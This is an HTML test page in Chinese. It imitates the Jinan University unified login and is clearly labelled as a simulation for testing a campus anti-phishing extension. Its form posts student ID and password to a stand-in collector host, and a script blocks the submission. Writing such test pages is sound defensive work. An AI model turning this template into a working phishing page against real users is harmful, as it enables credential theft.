<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>暨南大学统一身份认证 · 安全测试模拟页面</title>
  <style>
    :root{font-family:system-ui,-apple-system,"Segoe UI",sans-serif;color:#17382d;background:#f4f8f5}
    *{box-sizing:border-box}body{margin:0}.notice{background:#fff1d6;border-bottom:1px solid #e6c47b;color:#684a12;padding:11px 20px;text-align:center;font-size:13px;font-weight:700}
    .page{max-width:960px;margin:50px auto;padding:0 22px}.panel{max-width:430px;margin:0 auto;background:#fff;border:1px solid #d7e5dd;border-radius:16px;padding:30px;box-shadow:0 14px 40px #17463212}
    .fake-mark{width:44px;height:44px;border-radius:13px;background:#087f52;color:#fff;display:grid;place-items:center;font-weight:800;margin-bottom:22px}.label{display:block;font-size:12px;color:#587469;margin-top:15px}.input{display:block;width:100%;padding:12px;margin-top:6px;border:1px solid #cdded4;border-radius:8px;font-size:14px}.submit{width:100%;margin-top:22px;border:0;border-radius:8px;background:#087f52;color:#fff;padding:12px;font-weight:700;cursor:pointer}.hint{font-size:12px;color:#71887d;line-height:1.6}.danger{margin-top:22px;border-left:3px solid #bd4a3d;padding:10px 12px;background:#fff3f1;color:#884038;font-size:12px;line-height:1.6}
  </style>
</head>
<body>
  <div class="notice">安全测试模拟页面 · 非暨南大学官方网站 · 不要输入真实账号或密码</div>
  <main class="page"><section class="panel">
    <div class="fake-mark">测</div>
    <h1>统一身份认证</h1>
    <p class="hint">本页面用于验证校园反钓鱼插件：页面含有校园登录文案、密码输入框，并将表单指向不同域名。</p>
    <form action="https://collector.example.test/submit" onsubmit="event.preventDefault();document.getElementById('result').textContent='测试完成：表单未发送任何数据。';">
      <label class="label">学号<input class="input" name="student-id" autocomplete="off"></label>
      <label class="label">密码<input class="input" type="password" name="password" autocomplete="off"></label>
      <button class="submit" type="submit">登录测试</button>
    </form>
    <p id="result" class="hint" aria-live="polite"></p>
    <div class="danger">风险构造说明：HTTP 页面、校园登录语义、密码输入框、跨域表单提交。请只用于本机插件测试。</div>
  </section></main>
</body>
</html>
